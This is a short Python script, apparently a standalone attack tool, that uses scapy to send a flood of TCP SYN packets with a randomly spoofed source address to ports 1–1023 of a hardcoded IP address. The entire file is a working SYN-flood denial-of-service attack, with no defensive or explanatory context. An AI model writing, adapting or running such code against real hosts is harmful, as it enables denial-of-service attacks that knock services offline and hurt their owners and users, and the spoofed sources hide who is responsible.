from scapy.all import *
from random import shuffle

def getRandomIP():
    ipfactors = [x for x in range(256)]
    tmpip = []
    for i in range(4):
        shuffle(ipfactors)
        tmpip.append(str(ipfactors[0]))
    randomip = '.'.join(tmpip)
    return randomip

def synAttack(targetip):
    srcip = getRandomIP()
    pIP = IP(src=srcip, dst=targetip)
    pTCP = TCP(dport=range(1, 1024), flags='S')
    packet = pIP/pTCP
    srflood(packet, store=0)

def main():
    targetip = '123.223.221.111'
    synAttack(targetip)

if __name__ == '__main__':
    main()